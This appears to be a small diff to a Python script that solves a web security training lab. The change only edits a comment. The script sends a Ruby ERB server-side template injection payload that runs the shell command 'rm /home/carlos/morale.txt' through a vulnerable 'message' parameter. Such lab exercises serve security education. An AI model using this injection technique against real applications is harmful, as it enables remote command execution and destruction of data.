@@ -12,7 +12,7 @@ import requests
 lab_id = '0a5f001b0357ec9880d31ce600540071' #change based on generated lab
 uri = f"https://{lab_id}.web-security-academy.net/?message=" # The message param is vulnerable to SSTI
 
-payload = "<%= system('rm /home/carlos/morale.txt') %>" # Ruby ERB template unsandboxed payload for deleting files
+payload = "<%= system('rm /home/carlos/morale.txt') %>" # Ruby ERB template un-sandboxed payload for deleting files
 
 r = requests.get(uri + payload)
 if "Congratulations" in r.text:
